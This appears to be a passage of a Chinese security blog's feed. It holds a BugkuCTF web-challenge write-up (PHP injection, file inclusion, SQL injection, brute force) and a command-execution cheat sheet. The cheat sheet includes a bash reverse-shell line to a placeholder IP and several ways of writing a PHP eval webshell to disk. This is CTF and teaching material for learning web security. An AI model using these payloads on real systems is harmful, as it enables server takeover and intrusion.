    <content type="html"><![CDATA[<p>先放出bugkuctf网址:<a href="http://ctf.bugku.com/" target="_blank" rel="noopener">click me</a></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><a id="more"></a><p>进去一大片的滑稽,速度还越来越快<br>f12看一下，嗯，得flag</p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>要求输入两个一百以内数字相加的结果，输入框限了长度<br>审查元素更改maxlength,提交得flag</p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>显示了以下代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_GET</span>[<span class="string">'what'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">'flag'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure></p><p>用get传值what=flag</p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">'what'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">'flag'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure><p>打开hackbar<br>post数据what=flag</p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求num=1却不是数字<br>php特性，提交1a (随便加个字母)</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>无限弹窗flag就在这里…<br><img src="BugkuCTF-web3.png" alt=""><br>抓包看一下<br>html实体编码，解一下</p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>hint:听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag<br>之前是自己傻x了….<br>/etc/hosts 里加个123.206.87.240 flag.bugku.com就好了</p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>疯狂刷新…..<br><img src="BugkuCTF-stop.png" alt=""><br>抓包拦截<br>得flag</p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    include <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="built_in">eval</span>( <span class="string">"var_dump(<span class="variable">$a</span>);"</span>); </span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造闭合符号就好了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello=); show_source(flag.php</span><br></pre></td></tr></table></figure></p><p>没反应，尴尬<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello=); <span class="built_in">print</span>(flag.php</span><br></pre></td></tr></table></figure></p><p>测试一下<br>输出了flagphp，wtf？过滤了.<br>换个思路<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello=);print_r(file(<span class="string">"flag.php"</span>)</span><br></pre></td></tr></table></figure></p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        die(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var_dump($<span class="variable">$args</span>);"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以为又是绕过，耗了好些时间….后来发现$$<br>php全局变量GLOBALS，$GLOBALS可以调用，果断?args=GLOBALS<br>get it</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>hint1:jspfuck<br>hint2:大写<br>f12看到<br><img src="BugkuCTF-web5.png" alt=""><br>是jsfuck，控制台黏贴回车</p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>什么也没有？？？<br>抓包看看,有点意思flag在消息头</p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>嗯..一个黑页，翻了翻什么都没有<br>上目录扫描器(我这里用dirsearch)用御剑的人会比较多<br><img src="BugkuCTF-webshell-dirsearch.png" alt=""><br>扫到个马,先访问看看，要输密码，随便输一个试试<br>提示不是自己的马不要乱骑…有点意思<br>拿burp挂个字典直接爆破…<br><img src="BugkuCTF-hack.png" alt=""></p><h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>登录框emmmm,试试万能密码<br><img src="BugkuCTF-1003.png" alt=""><br>记录ip，还真有点小怕怕呢~<br>插个X-Forwarded-For: 123.206.31.85<br>不报禁止访问了，然后?卡了一会，f12看一下<br>有个注释<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dGVzdDEyMw==</span><br></pre></td></tr></table></figure></p><p>是base64，解码test123<br>目测是密码，那用户名呢?admin?root?administrator?<br>都不是?<br>不对，换个思路，改X-Forwarded-For: 192.168.1.1<br>再改127.0.0.1<br>成了，咋就忘了这个呢….尴尬</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="BugkuCTF-web4.png" alt=""><br>usl解码看看，乱七八糟，理一下格式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">checkSubmit</span></span>()&#123;</span><br><span class="line">var a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="built_in">return</span>!0;</span><br><span class="line">alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="built_in">return</span>!1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(unescape(p1) + unescape(<span class="string">'%35%34%61%61%32'</span> + p2));</span><br></pre></td></tr></table></figure></p><p>手动拼接再解码<br>提交67d709b2b54aa2aa648cf6e87a7114f1</p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>click me.<br>点之，跳转url有东西<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=show.php</span><br></pre></td></tr></table></figure></p><p>是文件包含，直接filter协议读<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>看到了’//flag:flag{edulcni_elif_lacol_si_siht}’</p><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>120.24.86.145:8002/baopo/<br>既然都写得这么明明白白的爆破了那就爆破吧<br>五位数数字，要不了多久<br>第一次没爆出来？？？是自己傻逼了，调了5递增…<br>再爆一次<br><img src="BugkuCTF-baopo.png" alt=""></p><h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>hints:javascript<br><img src="BugkuCTF-onebillion.png" alt=""><br>f12看一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var clicks=0</span><br><span class="line">$(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">  $(<span class="string">"#cookie"</span>)</span><br><span class="line">    .mousedown(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .mouseup(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">      clicks++;</span><br><span class="line">      $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">      <span class="keyword">if</span>(clicks &gt;= 1000000)&#123;</span><br><span class="line">        var form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line">        <span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line">        <span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">        $(<span class="string">'body'</span>).append(form);</span><br><span class="line">        form.submit();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>代码都在这里怎么改都行了<br>大于1000000就post个表单。。<br>我干脆构造一个post表单提交就好了</p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>备份，典型的源码泄露<br>直接访问index.php.bak<br>下载下来看一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, 0);</span><br><span class="line"><span class="variable">$str</span> = strstr(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="variable">$str</span> = substr(<span class="variable">$str</span>,1);</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,<span class="variable">$str</span>);</span><br><span class="line">parse_str(<span class="variable">$str</span>);</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$key1</span>) == md5(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>md5相等，值不等。。<br>php隐式转换的缺陷，PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0<br>所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0<br>240610708和QNKCDZO<br>但还是有一个坑str_replace过滤了key<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8002/web16/index.php?kekeyy1=240610708&amp;&amp;kekeyy2=QNKCDZO</span><br></pre></td></tr></table></figure></p><p>成了</p><h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>嗯，sql注入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">' or 1=1#</span></span><br></pre></td></tr></table></figure></p><p>不报错。<br>union查询和时间盲注<br>丢到sqlmap直接跑<br><img src="BugkuCTF-chengjidan.png" alt=""></p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p><img src="BugkuCTF-qiumingshan.png" alt=""><br>写个小jio本吧….<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from lxml import html</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/qiumingshan/'</span></span><br><span class="line">requests = requests.Session()</span><br><span class="line">rs = requests.get(url)</span><br><span class="line">rs = html.fromstring(rs.content)</span><br><span class="line">rs = str(rs.xpath(<span class="string">'//div/text()'</span>))</span><br><span class="line">rs = <span class="built_in">eval</span>(rs[2:-5])</span><br><span class="line">data=&#123;</span><br><span class="line">  <span class="string">'value'</span>: rs</span><br><span class="line">&#125;</span><br><span class="line">rs = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span> rs.content</span><br></pre></td></tr></table></figure></p><p>如果值名不对会提示用value:Give me value post about….</p><p>原来你也是老司机 Bugku{YOU_DID_IT_BY_SECOND}<br>[Finished in 0.9s]</p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>hint:格式KEY{xxxxxxxxxxxxxx}<br>数据包里有东西<br><img src="BugkuCTF-web6.png" alt=""><br>看着像base64，解码<br>按照提示POST一个参数margin=WQpzogT0RJek9EVXc=<br>提示让快点，脚本侍候，不行加个解码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web6/"</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">rs = session.get(url).headers[<span class="string">'flag'</span>]</span><br><span class="line">flag = base64.b64decode(base64.b64decode(rs).split(<span class="string">':'</span>)[1])</span><br><span class="line">payload = &#123;<span class="string">'margin'</span>:flag&#125;</span><br><span class="line">rs = session.post(url,payload)</span><br><span class="line"><span class="built_in">print</span> rs.content</span><br></pre></td></tr></table></figure></p><h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h2><p>刚开始还以为真搞cookie<br>实际上是文件包含泄漏主页源码<br>请求url参数经过base64编码，解码发现是keys.txt,把index.php编码一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/web11/index.php?line=&amp;filename=aW5kZXgucGhw</span><br></pre></td></tr></table></figure></p><p>只有一行，注意到line参数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(0,20):</span><br><span class="line">  url = <span class="string">"http://123.206.87.240:8002/web11/index.php?line="</span>+str(i)+<span class="string">"&amp;filename=aW5kZXgucGhw"</span></span><br><span class="line">  rs = requests.get(url)</span><br><span class="line">  <span class="built_in">print</span> rs.text</span><br></pre></td></tr></table></figure></p><p>循环读一下源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=base64_decode(isset(<span class="variable">$_GET</span>[<span class="string">'filename'</span>])?<span class="variable">$_GET</span>[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"><span class="variable">$line</span>=isset(<span class="variable">$_GET</span>[<span class="string">'line'</span>])?intval(<span class="variable">$_GET</span>[<span class="string">'line'</span>]):0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_list</span> = array(</span><br><span class="line">  <span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line">  <span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">'margin'</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$file_list</span>[2]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$file</span>, <span class="variable">$file_list</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$fa</span> = file(<span class="variable">$file</span>);</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这下名副其实cookie欺骗了<br><img src="BugkuCTF-web11.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先放出bugkuctf网址:&lt;a href=&quot;http://ctf.bugku.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;click me&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web2&quot;&gt;&lt;/a&gt;web2&lt;/h2&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://t43wiu6.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>命令执行那些事</title>
    <link href="https://t43wiu6.github.io/2018/09/09/safe-command-exec/"/>
    <id>https://t43wiu6.github.io/2018/09/09/safe-command-exec/</id>
    <published>2018-09-09T12:39:32.000Z</published>
    <updated>2019-10-12T02:41:18.067Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令执行定义"><a href="#命令执行定义" class="headerlink" title="命令执行定义"></a>命令执行定义</h2><p>使用执行系统命令的函数时，没有进行过滤</p><ul><li>继承web服务器权限</li></ul><h2 id="命令执行相关函数"><a href="#命令执行相关函数" class="headerlink" title="命令执行相关函数"></a>命令执行相关函数</h2><a id="more"></a><blockquote><ul><li>system(返回最后一行)</li><li>exec</li><li>passthru(返回最后一行)</li><li>shell_exec 作用与 <code></code>反引号一致</li><li>popen(返回文件指针)</li><li>proc_open(返回文件指针)</li><li>pcntl_exec 多进程处理扩展,需额外安装 (string $path, array $args, array $envs)</li></ul></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$w = <span class="string">'whoami'</span>;</span><br><span class="line"></span><br><span class="line">system($w);</span><br><span class="line">passthru($w);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>.<span class="string">'exec:'</span>.exec($w).<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'shell_exec:'</span>.shell_exec($w).<span class="string">'&lt;br/&gt;'</span>; </span><br><span class="line"><span class="keyword">echo</span> `$w`;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> popen(<span class="string">'whoami'</span>,<span class="string">'r'</span>); <span class="comment">//(cmd,mode[r,w])//读和写</span></span><br><span class="line">proc_open(<span class="string">'proc_open:'</span>.$w).<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">pcntl_exec(<span class="string">'pcntl_exec:'</span>.$w).<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="命令执行防御函数"><a href="#命令执行防御函数" class="headerlink" title="命令执行防御函数"></a>命令执行防御函数</h2><blockquote><ul><li>escapeshellarg() //转义参数 将引号替换为空格</li><li>escapeshellcmd() //过滤整条命令(win下加^ linux加\)</li></ul></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'ls '</span>.escapeshellarg(<span class="string">'a"'</span>);</span><br></pre></td></tr></table></figure><p>过滤字符有<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \xFF %</span><br><span class="line"><span class="string">' " 在不成对情况下也过滤</span></span><br></pre></td></tr></table></figure></p><h2 id="代码执行相关函数"><a href="#代码执行相关函数" class="headerlink" title="代码执行相关函数"></a>代码执行相关函数</h2><blockquote><ul><li>eval</li><li>assert</li><li>preg_replace (php&lt;=5.5)</li><li>call_user_func</li><li>call_user_func_array</li><li>array_map</li></ul></blockquote><p>前两个就不说了，一句话常见</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br><span class="line"></span><br><span class="line"><span class="comment">//搜索subject中匹配pattern的部分， 以replacement进行替换。</span></span><br><span class="line"><span class="comment">//当第一个参数的正则表达式有e修正符的时候，第二个参数的字符串当做PHP代码执行</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line">preg_replace(“/test/e”,$_GET[<span class="string">"cmd"</span>],”jutsttest”);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//?value=[phpinfo()]</span></span><br><span class="line">preg_replace(<span class="string">'/\[(.*)\]/e'</span>, <span class="string">'strtolower("\\1")'</span>, $_GET[<span class="string">'value'</span>]);</span><br><span class="line"><span class="comment">//strtolower("\\1")实际就是\1 而\1在正则中有自己的含义</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>反向引用</strong></p></blockquote><blockquote><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><blockquote><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">深入研究preg_replace</a></p><p>所以这里的 <strong>\1</strong> 实际上指定的是第一个子匹配项,即value中第一个子匹配项,达到代码执行目的</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- call_user_func()</span><br><span class="line">- call_user_func_array()</span><br><span class="line">- array_map()</span><br><span class="line">    </span><br><span class="line"><span class="comment">//调用其他函数功能</span></span><br><span class="line"><span class="comment">//第一个参数为回调函数,后面的参数为回调函数的参数</span></span><br><span class="line">$b = <span class="string">'phpinfo()'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>], $b);</span><br><span class="line"><span class="comment">//当?a=eval时就调用了eval函数而phpinfo()作为参数</span></span><br></pre></td></tr></table></figure><h2 id="命令执行常用符"><a href="#命令执行常用符" class="headerlink" title="命令执行常用符"></a>命令执行常用符</h2><blockquote><ul><li>Windows支持的管道符<br>| 直接执行后边的<br>|| 如果前面执行出错，执行后边，只能为假<br>&amp; 如果前面语句为假则直接执行后边，前边可真可假<br>&amp;&amp; 前边假出错，前边只能为真</li><li>Linux支持的管道符<br>; 执行完前边执行后边<br>| 先是后边语句执行结果<br>|| 当前语句执行出错，执行后边<br>&amp; 如果前边为假直接执行后边，前面可真可假<br>&amp;&amp; 如果前边为假出错，只能为真</li></ul></blockquote><h2 id="命令执行的奇淫技巧"><a href="#命令执行的奇淫技巧" class="headerlink" title="命令执行的奇淫技巧"></a>命令执行的奇淫技巧</h2><ul><li>绕过黑名单<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a1;b=s;$a$b</span><br></pre></td></tr></table></figure></li></ul><h3 id="无回显绕过方法"><a href="#无回显绕过方法" class="headerlink" title="无回显绕过方法"></a>无回显绕过方法</h3><ul><li><p>弹shell，nc监听判断</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -l -p 8080 -vvv</span><br><span class="line">|bash -i &gt;&amp; /dev/tcp/IP/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><p>利用DNS隧道<br><a href="https://mp.weixin.qq.com/s/jwqWnP0FHhMoR5b6iCS6NQ?" target="_blank" rel="noopener">参考文章</a></p></li></ul><h3 id="利用echo写马"><a href="#利用echo写马" class="headerlink" title="利用echo写马"></a>利用echo写马</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;?php @eval($_GET[1]);?&gt;'</span>&gt;<span class="number">1.</span>php</span><br></pre></td></tr></table></figure><p>如果长度有限制可以追加绕过<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;?php'</span>&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'@eval('</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$_GET['</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'1]);'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'?&gt;'</span>&gt;&gt;<span class="number">1.</span>php</span><br></pre></td></tr></table></figure></p><p>或者用反斜杠\拼接<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php @eval(\</span></span><br><span class="line"><span class="string">\$_POST[1]); ?&gt;"</span>\</span><br><span class="line">&gt;&gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure></p><p>使用单引号的时候反斜杠会写进语句的里面，所以使用双引号，然后在$的前面加一个反斜杠转义</p><h3 id="利用ls写马"><a href="#利用ls写马" class="headerlink" title="利用ls写马"></a>利用ls写马</h3><p>通过ls -t按时间排列写马<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'?&gt;'</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'($_POST[1]);'</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'@eval'</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'&lt;?php'</span></span><br><span class="line">ls -t &gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;命令执行定义&quot;&gt;&lt;a href=&quot;#命令执行定义&quot; class=&quot;headerlink&quot; title=&quot;命令执行定义&quot;&gt;&lt;/a&gt;命令执行定义&lt;/h2&gt;&lt;p&gt;使用执行系统命令的函数时，没有进行过滤&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;继承web服务器权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;命令执行相关函数&quot;&gt;&lt;a href=&quot;#命令执行相关函数&quot; class=&quot;headerlink&quot; title=&quot;命令执行相关函数&quot;&gt;&lt;/a&gt;命令执行相关函数&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="命令执行" scheme="https://t43wiu6.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Web安全" scheme="https://t43wiu6.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HEXO配置教程(Next.Mist主题)</title>
    <link href="https://t43wiu6.github.io/2018/07/24/hexo-config/"/>
    <id>https://t43wiu6.github.io/2018/07/24/hexo-config/</id>
    <published>2018-07-24T13:23:04.000Z</published>
    <updated>2019-12-25T01:26:39.580Z</updated>
    
